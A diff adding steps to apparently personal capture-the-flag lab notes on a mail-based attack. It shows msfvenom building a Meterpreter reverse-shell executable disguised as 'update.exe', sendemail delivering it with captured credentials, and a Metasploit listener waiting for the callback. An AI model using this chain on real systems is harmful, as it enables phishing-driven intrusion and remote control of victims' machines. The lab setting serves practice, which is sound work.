@@ -53,3 +53,19 @@ try pop3 with user creds .. nothing
 
 you must send mail with reverse shell
 
+
+**make RS**
+root@ip-10-10-82-18:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.82.18 LPORT=4444 -f exe -o update.exe
+
+**sendmail with atth rs**
+root@ip-10-10-82-18:~# sendemail -s 10.10.135.252:25 -xu lhedvig@brownbrick.co -xp bricks -f lhedvig@brownbrick.co -t lhedvig@brownbrick.co   -a ./update.exe 
+
+tel
+**Run Listener**
+msf6 exploit(multi/handler) > set LHOST 10.10.82.18
+LHOST => 10.10.82.18
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 10.10.82.18:4444 
+
+
+
